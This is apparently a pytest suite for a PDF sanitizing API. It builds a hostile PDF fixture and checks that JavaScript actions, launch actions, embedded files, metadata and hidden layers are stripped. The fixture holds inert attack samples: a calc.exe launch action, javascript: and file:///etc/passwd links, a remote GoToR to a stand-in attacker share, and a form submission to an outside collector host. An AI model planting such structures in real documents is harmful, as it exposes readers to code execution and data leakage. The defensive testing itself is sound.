"""Sanitize removes active content, attachments, hidden layers and metadata.

Each fixture is built with pikepdf, so the test decides exactly which PDF
structures exist, and is then posted through the real /api/sanitize route.
The assertions walk the whole object graph of the output: the risky parts are
usually direct dictionaries inside annotations, outlines and name trees, where
a scan of top-level objects never looks.
"""

from __future__ import annotations

import io

import fitz
import pikepdf
import pytest
from pikepdf import Array, Dictionary, Name, String

XMP_PACKET = (
    b'<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>'
    b'<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
    b'<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">'
    b"<dc:creator><rdf:Seq><rdf:li>Alice Secret</rdf:li></rdf:Seq></dc:creator>"
    b'</rdf:Description></rdf:RDF></x:xmpmeta><?xpacket end="w"?>'
)


def _js(code: str) -> Dictionary:
    return Dictionary(S=Name.JavaScript, JS=String(code))


def _save(pdf: pikepdf.Pdf, **kwargs) -> bytes:
    buf = io.BytesIO()
    pdf.save(buf, **kwargs)
    return buf.getvalue()


def _reachable(pdf: pikepdf.Pdf):
    """Yield every dictionary and stream reachable from the trailer, each once."""
    seen = set()
    stack = [pdf.trailer]
    while stack:
        obj = stack.pop()
        if isinstance(obj, (Dictionary, pikepdf.Stream, Array)) and obj.is_indirect:
            if obj.objgen in seen:
                continue
            seen.add(obj.objgen)
        if isinstance(obj, pikepdf.Stream):
            stack.extend(obj.stream_dict.values())
            yield obj
        elif isinstance(obj, Dictionary):
            stack.extend(obj.values())
            yield obj
        elif isinstance(obj, Array):
            stack.extend(obj)


def _walk(pdf: pikepdf.Pdf):
    """Yield every dictionary reachable from the trailer, stream dictionaries included."""
    for obj in _reachable(pdf):
        yield obj.stream_dict if isinstance(obj, pikepdf.Stream) else obj


def _content_streams(pdf: pikepdf.Pdf) -> bytes:
    """Decoded page contents plus every form XObject, so deleted text can be searched for."""
    parts = []
    for page in pdf.pages:
        contents = page.obj.get("/Contents", Array())
        parts += [s.read_bytes() for s in (contents if isinstance(contents, Array) else [contents])]
    parts += [
        obj.read_bytes() for obj in _reachable(pdf)
        if isinstance(obj, pikepdf.Stream) and obj.stream_dict.get("/Subtype") == Name.Form
    ]
    return b"\n".join(parts)


def _sanitize(client, data: bytes) -> bytes:
    resp = client.post("/api/sanitize", files={"file": ("in.pdf", data, "application/pdf")})
    assert resp.status_code == 200, resp.text
    assert resp.headers["content-type"] == "application/pdf"
    return resp.content


def _open(data: bytes) -> pikepdf.Pdf:
    return pikepdf.open(io.BytesIO(data))


def _link(pdf: pikepdf.Pdf, y: int, **entries) -> Dictionary:
    return pdf.make_indirect(
        Dictionary(Type=Name.Annot, Subtype=Name.Link, Rect=Array([72, y, 300, y + 12]), Border=Array([0, 0, 0]), **entries)
    )


def _hostile_pdf() -> bytes:
    pdf = pikepdf.new()
    pdf.add_blank_page(page_size=(612, 792))
    pdf.add_blank_page(page_size=(612, 792))
    page, second = pdf.pages[0], pdf.pages[1]
    font = pdf.make_indirect(Dictionary(Type=Name.Font, Subtype=Name.Type1, BaseFont=Name.Helvetica))
    photo = pdf.make_stream(bytes([0, 128, 255]))
    photo.Type, photo.Subtype, photo.Width, photo.Height = Name.XObject, Name.Image, 1, 1
    photo.ColorSpace, photo.BitsPerComponent = Name.DeviceRGB, 8
    photo.Metadata = pdf.make_stream(XMP_PACKET)  # XMP on a stream, as cameras and editors attach it
    page.obj.Resources = Dictionary(Font=Dictionary(F1=font), XObject=Dictionary(Im0=photo))
    page.obj.Contents = pdf.make_stream(b"BT /F1 12 Tf 72 740 Td (Plain text) Tj ET q 10 0 0 10 400 700 cm /Im0 Do Q")
    page.obj.AA = Dictionary(O=_js("app.alert('page open')"))

    pdf.Root.OpenAction = _js("app.alert('open')")
    pdf.Root.AA = Dictionary(WC=_js("app.alert('closing')"))

    payload = pdf.make_stream(b"MZ not really an executable")
    payload.Type = Name.EmbeddedFile
    attachment = pdf.make_indirect(
        Dictionary(Type=Name.Filespec, F=String("payload.exe"), UF=String("payload.exe"), EF=Dictionary(F=payload))
    )
    pdf.Root.Names = Dictionary(
        JavaScript=Dictionary(Names=Array([String("init"), _js("app.alert('init')")])),
        EmbeddedFiles=Dictionary(Names=Array([String("payload.exe"), attachment])),
        Renditions=Dictionary(Names=Array([String("clip"), Dictionary(S=Name.MR, C=Dictionary(S=Name.MCD, D=attachment))])),
    )
    pdf.Root.AF = Array([attachment])

    xmp = pdf.make_stream(XMP_PACKET)
    xmp.Type = Name.Metadata
    xmp.Subtype = Name.XML
    pdf.Root.Metadata = xmp
    page.obj.Metadata = pdf.make_stream(XMP_PACKET)
    pdf.Root.Collection = Dictionary(Type=Name.Collection, View=Name.T)
    pdf.trailer.Info = pdf.make_indirect(Dictionary(Title=String("Secret title"), Author=String("Alice Secret")))

    field = pdf.make_indirect(
        Dictionary(
            Type=Name.Annot, Subtype=Name.Widget, FT=Name.Tx, T=String("name"), V=String("Filled value"),
            Rect=Array([72, 300, 300, 320]), P=page.obj, AA=Dictionary(K=_js("event.rc = true;")),
        )
    )
    button = pdf.make_indirect(
        Dictionary(
            Type=Name.Annot, Subtype=Name.Widget, FT=Name.Btn, Ff=65536, T=String("send"),
            Rect=Array([72, 260, 150, 280]), P=page.obj,
            A=Dictionary(S=Name.SubmitForm, F=Dictionary(FS=Name.URL, F=String("https://collector.example/")), Flags=4),
        )
    )
    orphan = pdf.make_indirect(
        Dictionary(Type=Name.Annot, Subtype=Name.Widget, FT=Name.Btn, Ff=65536, T=String("orphan"),
                   Rect=Array([0, 0, 0, 0]), A=_js("app.alert('orphan')"))
    )
    pdf.Root.NeedsRendering = True
    pdf.Root.AcroForm = Dictionary(
        Fields=Array([field, button, orphan]),
        XFA=pdf.make_stream(b"<xdp:xdp xmlns:xdp='http://ns.adobe.com/xdp/'><script>app.alert(1)</script></xdp:xdp>"),
    )

    def media(subtype: Name, **entries) -> Dictionary:
        return pdf.make_indirect(Dictionary(Type=Name.Annot, Subtype=subtype, Rect=Array([400, 400, 450, 450]), **entries))

    file_note = pdf.make_indirect(
        Dictionary(Type=Name.Annot, Subtype=Name.FileAttachment, Rect=Array([72, 480, 90, 498]), FS=attachment)
    )
    page.obj.Annots = pdf.make_indirect(Array([
        _link(pdf, 700, A=Dictionary(S=Name.Launch, F=String("calc.exe"))),
        _link(pdf, 680, A=Dictionary(S=Name.URI, URI=String("javascript:app.alert(1)"))),
        _link(pdf, 660, A=Dictionary(S=Name.URI, URI=String("file:///etc/passwd"))),
        _link(pdf, 640, A=Dictionary(S=Name.GoToR, F=String("\\\\attacker\\share\\x.pdf"), D=Array([0, Name.Fit]))),
        _link(pdf, 620, A=Dictionary(S=Name.URI, URI=String("https://example.com/"))),
        _link(pdf, 600, A=Dictionary(S=Name.URI, URI=String("mailto:someone@example.com"))),
        _link(pdf, 580, A=Dictionary(S=Name.GoTo, D=Array([second.obj, Name.Fit]), Next=_js("app.alert('chained')"))),
        _link(pdf, 560, Dest=Array([second.obj, Name.Fit])),
        _link(pdf, 540, A=Dictionary(S=Name.Named, N=Name.NextPage)),
        _link(pdf, 460, A=Dictionary(S=Name.URI, URI=String("https://example.org/")),
              PA=Dictionary(S=Name.URI, URI=String("javascript:app.alert(2)"))),
        _link(pdf, 520, A=Dictionary(S=Name.Named, N=Name.SaveAs)),
        _link(pdf, 500, A=Dictionary(S=Name.Thread, F=String("other.pdf"), D=0)),
        file_note,
        pdf.make_indirect(Dictionary(Type=Name.Annot, Subtype=Name.Popup, Rect=Array([100, 500, 200, 550]), Parent=file_note)),
        media(Name.Screen, A=Dictionary(S=Name.Rendition, OP=0)),
        media(Name.Sound, Sound=pdf.make_stream(b"\x00" * 16)),
        media(Name.Movie, Movie=Dictionary(F=String("clip.mov"))),
        media(Name.RichMedia),
        media(Name("/3D")),
        field,
        button,
    ]))

    scripted = pdf.make_indirect(Dictionary(Title=String("Scripted bookmark"), A=_js("app.alert('bookmark')")))
    chapter = pdf.make_indirect(Dictionary(Title=String("Chapter two"), Dest=Array([second.obj, Name.Fit])))
    outlines = pdf.make_indirect(Dictionary(Type=Name.Outlines, First=scripted, Last=chapter, Count=2))
    scripted.Parent = outlines
    scripted.Next = chapter
    chapter.Parent = outlines
    chapter.Prev = scripted
    pdf.Root.Outlines = outlines
    return _save(pdf, compress_streams=False)


@pytest.fixture(scope="module")
def sanitized_hostile(client) -> bytes:
    return _sanitize(client, _hostile_pdf())


def _annotations(pdf: pikepdf.Pdf) -> list[Dictionary]:
    return [annot for page in pdf.pages for annot in page.obj.get("/Annots", Array())]


def test_hostile_fixture_contains_what_the_tests_expect_to_be_removed():
    """Guards the fixture: every structure the other tests look for is really in the input."""
    pdf = _open(_hostile_pdf())
    dicts = list(_walk(pdf))
    assert any(d.get("/S") == Name.JavaScript for d in dicts)
    assert any("/AA" in d for d in dicts)
    assert any(d.get("/Type") == Name.EmbeddedFile for d in dicts)
    assert any("/Metadata" in d for d in dicts)
    assert any("/XFA" in d for d in dicts)


def test_document_and_chained_javascript_is_removed(sanitized_hostile):
    pdf = _open(sanitized_hostile)
    assert not [d for d in _walk(pdf) if d.get("/S") == Name.JavaScript or "/JS" in d]
    assert "/OpenAction" not in pdf.Root
    assert "/JavaScript" not in pdf.Root.get("/Names", Dictionary())


def test_additional_actions_are_removed_everywhere(sanitized_hostile):
    pdf = _open(sanitized_hostile)
    assert not [d for d in _walk(pdf) if "/AA" in d]


def test_risky_links_are_removed_and_ordinary_links_are_kept(sanitized_hostile):
    pdf = _open(sanitized_hostile)
    links = [a for a in _annotations(pdf) if a.get("/Subtype") == Name.Link]
    uris = sorted(str(a.A.URI) for a in links if "/A" in a and a.A.get("/S") == Name.URI)
    assert uris == ["https://example.com/", "https://example.org/", "mailto:someone@example.com"]
    kinds = sorted(str(a.A.S) for a in links if "/A" in a)
    assert kinds == ["/GoTo", "/Named", "/URI", "/URI", "/URI"]
    assert len(links) == 6, "a link whose only action was removed does nothing and should go"
    assert not [a for a in links if "/PA" in a]
    assert [str(a.A.N) for a in links if "/A" in a and a.A.S == Name.Named] == ["/NextPage"]
    assert len([a for a in links if "/Dest" in a]) == 1


def test_embedded_files_are_removed(sanitized_hostile):
    pdf = _open(sanitized_hostile)
    dicts = list(_walk(pdf))
    assert not [d for d in dicts if d.get("/Type") == Name.EmbeddedFile]
    assert not [d for d in dicts if "/EF" in d or "/AF" in d or "/EmbeddedFiles" in d]
    assert not [a for a in _annotations(pdf) if a.get("/Subtype") == Name.FileAttachment]
    assert "/Collection" not in pdf.Root


def test_multimedia_annotations_are_removed(sanitized_hostile):
    pdf = _open(sanitized_hostile)
    subtypes = {str(a.Subtype) for a in _annotations(pdf)}
    assert subtypes == {"/Link", "/Widget"}
    assert "/Renditions" not in pdf.Root.Names


def test_xmp_and_document_info_are_removed(sanitized_hostile):
    pdf = _open(sanitized_hostile)
    assert "/Info" not in pdf.trailer
    assert not [d for d in _walk(pdf) if "/Metadata" in d]
    assert b"Alice Secret" not in sanitized_hostile


def test_form_fields_stay_fillable_without_their_actions(sanitized_hostile):
    pdf = _open(sanitized_hostile)
    fields = {str(f.T): f for f in pdf.Root.AcroForm.Fields}
    assert set(fields) == {"name", "send", "orphan"}
    assert str(fields["name"].V) == "Filled value"
    assert "/A" not in fields["send"]
    assert "/A" not in fields["orphan"]
    assert "/XFA" not in pdf.Root.AcroForm
    assert "/NeedsRendering" not in pdf.Root
    doc = fitz.open(stream=sanitized_hostile, filetype="pdf")
    assert sorted(w.field_name for w in doc[0].widgets()) == ["name", "send"]


def test_bookmark_actions_are_filtered_but_bookmarks_are_kept(sanitized_hostile):
    pdf = _open(sanitized_hostile)
    first = pdf.Root.Outlines.First
    assert [str(first.Title), str(first.Next.Title)] == ["Scripted bookmark", "Chapter two"]
    assert "/A" not in first
    assert "/Dest" in first.Next


def test_page_text_survives(sanitized_hostile):
    doc = fitz.open(stream=sanitized_hostile, filetype="pdf")
    assert "Plain text" in doc[0].get_text()


# ── Optional content (layers) ────────────────────────────────────────────────

_HIDDEN_BY_OFF_LIST = {"OFF": "hidden"}
_HIDDEN_BY_BASE_STATE = {"BaseState": "OFF", "ON": "shown"}


def _layered_pdf(default_config: dict, with_visibility_expression: bool = True) -> bytes:
    """One page mixing visible, hidden and membership-controlled content.

    "Shown" is on and "Hidden" is off in the default configuration, whichever
    way the configuration expresses that. /A is a membership dictionary that is
    visible when all of its groups are off; /N uses a visibility expression that
    is true when "Shown" is off, so its content is hidden.
    """
    pdf = pikepdf.new()
    pdf.add_blank_page(page_size=(300, 320))
    page = pdf.pages[0]
    shown = pdf.make_indirect(Dictionary(Type=Name.OCG, Name=String("Shown")))
    hidden = pdf.make_indirect(Dictionary(Type=Name.OCG, Name=String("Hidden")))
    groups = {"shown": shown, "hidden": hidden}
    config = Dictionary()
    for key, value in default_config.items():
        config[Name("/" + key)] = Name("/" + value) if key == "BaseState" else Array([groups[value]])
    pdf.Root.OCProperties = Dictionary(OCGs=Array([shown, hidden]), D=config)
    all_off = pdf.make_indirect(Dictionary(Type=Name.OCMD, OCGs=Array([hidden]), P=Name.AllOff))
    not_shown = pdf.make_indirect(Dictionary(Type=Name.OCMD, VE=Array([Name.Not, shown])))

    font = pdf.make_indirect(Dictionary(Type=Name.Font, Subtype=Name.Type1, BaseFont=Name.Helvetica))
    image = pdf.make_stream(bytes([255, 0, 0]) * 4)
    image.Type, image.Subtype, image.Width, image.Height = Name.XObject, Name.Image, 2, 2
    image.ColorSpace, image.BitsPerComponent, image.OC = Name.DeviceRGB, 8, hidden
    form = pdf.make_stream(
        b"/OC /H BDC BT /F1 12 Tf 0 20 Td (Hidden in form) Tj ET EMC BT /F1 12 Tf 0 0 Td (Shown in form) Tj ET"
    )
    form.Type, form.Subtype, form.BBox = Name.XObject, Name.Form, Array([0, 0, 200, 40])
    form.Resources = Dictionary(Font=Dictionary(F1=font), Properties=Dictionary(H=hidden))
    page.obj.Resources = Dictionary(
        Font=Dictionary(F1=font),
        Properties=Dictionary(S=shown, H=hidden, A=all_off, N=not_shown),
        XObject=Dictionary(Im1=image, Fm1=form),
    )
    expression_section = b"/OC /N BDC BT /F1 14 Tf 20 140 Td (Not shown member) Tj ET EMC\n"
    page.obj.Contents = pdf.make_stream(
        b"BT /F1 14 Tf 20 290 Td (Always here) Tj ET\n"
        b"/OC /S BDC BT /F1 14 Tf 20 260 Td (Shown layer) Tj ET EMC\n"
        b"/OC /H BDC 0 0 1 rg BT /F1 14 Tf 20 230 Td (Hidden layer) Tj ET 20 20 60 60 re f EMC\n"
        b"q 0 1 0 rg 100 20 20 20 re f Q\n"
        b"BT /F1 14 Tf 20 200 Td (Blue from the hidden layer) Tj ET\n"
        b"/OC /A BDC BT /F1 14 Tf 20 170 Td (All off member) Tj ET EMC\n"
        + (expression_section if with_visibility_expression else b"")
        + b"q 40 0 0 40 200 20 cm /Im1 Do Q\n"
        b"q 1 0 0 1 20 90 cm /Fm1 Do Q\n"
    )
    appearance = pdf.make_stream(b"0 1 0 rg 0 0 20 20 re f")
    appearance.Type, appearance.Subtype, appearance.BBox = Name.XObject, Name.Form, Array([0, 0, 20, 20])
    page.obj.Annots = Array([
        pdf.make_indirect(Dictionary(
            Type=Name.Annot, Subtype=Name.Square, Rect=Array([250, 250, 270, 270]),
            AP=Dictionary(N=appearance), OC=hidden,
        )),
    ])
    return _save(pdf, compress_streams=False)


def _render(data: bytes) -> bytes:
    doc = fitz.open(stream=data, filetype="pdf")
    return doc[0].get_pixmap(dpi=72).samples


@pytest.mark.parametrize("default_config", [_HIDDEN_BY_OFF_LIST, _HIDDEN_BY_BASE_STATE], ids=["off-list", "base-state"])
def test_page_with_layers_looks_the_same_after_sanitizing(client, default_config):
    # MuPDF, which renders here, does not evaluate /VE visibility expressions
    # and draws their content; Acrobat and pdf.js hide it, as the PDF
    # specification says. The deletion test below covers /VE.
    original = _layered_pdf(default_config, with_visibility_expression=False)
    assert _render(_sanitize(client, original)) == _render(original)


@pytest.mark.parametrize("default_config", [_HIDDEN_BY_OFF_LIST, _HIDDEN_BY_BASE_STATE], ids=["off-list", "base-state"])
def test_hidden_layer_content_is_deleted_rather_than_revealed(client, default_config):
    out = _sanitize(client, _layered_pdf(default_config))
    pdf = _open(out)
    content = _content_streams(pdf)
    for kept in (b"Always here", b"Shown layer", b"All off member", b"Shown in form", b"Blue from the hidden layer"):
        assert kept in content
    for gone in (b"Hidden layer", b"Not shown member", b"Hidden in form"):
        assert gone not in content
    assert "/OCProperties" not in pdf.Root
    assert not [d for d in _walk(pdf) if "/OC" in d]
    assert not [d for d in _walk(pdf) if d.get("/Subtype") == Name.Image]
    assert not pdf.pages[0].obj.get("/Annots")


def test_form_widget_in_a_hidden_layer_is_kept_and_shown(client):
    """Deleting the widget would leave its form field pointing at nothing."""
    pdf = pikepdf.new()
    pdf.add_blank_page()
    page = pdf.pages[0]
    hidden = pdf.make_indirect(Dictionary(Type=Name.OCG, Name=String("Hidden")))
    pdf.Root.OCProperties = Dictionary(OCGs=Array([hidden]), D=Dictionary(OFF=Array([hidden])))
    widget = pdf.make_indirect(Dictionary(
        Type=Name.Annot, Subtype=Name.Widget, FT=Name.Tx, T=String("layered"),
        Rect=Array([72, 72, 200, 90]), P=page.obj, OC=hidden,
    ))
    page.obj.Annots = Array([widget])
    pdf.Root.AcroForm = Dictionary(Fields=Array([widget]))
    out = _open(_sanitize(client, _save(pdf)))
    annots = out.pages[0].obj.Annots
    assert [str(a.T) for a in annots] == ["layered"]
    assert "/OC" not in annots[0]


# ── Encryption and ordinary files ────────────────────────────────────────────

def test_password_protected_pdf_is_rejected(client, locked_pdf):
    resp = client.post("/api/sanitize", files={"file": ("locked.pdf", locked_pdf, "application/pdf")})
    assert resp.status_code == 400
    assert "password" in resp.json()["detail"].lower()


def test_permission_restrictions_are_kept(client, sample_pdf):
    src = _open(sample_pdf)
    restricted = _save(src, encryption=pikepdf.Encryption(owner="owner-secret", user="", allow=pikepdf.Permissions(extract=False)))
    out = _open(_sanitize(client, restricted))
    assert out.is_encrypted
    assert out.allow.extract is False


def test_ordinary_pdf_keeps_its_text(client, sample_pdf):
    out = _sanitize(client, sample_pdf)
    assert fitz.open(stream=out, filetype="pdf")[0].get_text() == fitz.open(stream=sample_pdf, filetype="pdf")[0].get_text()
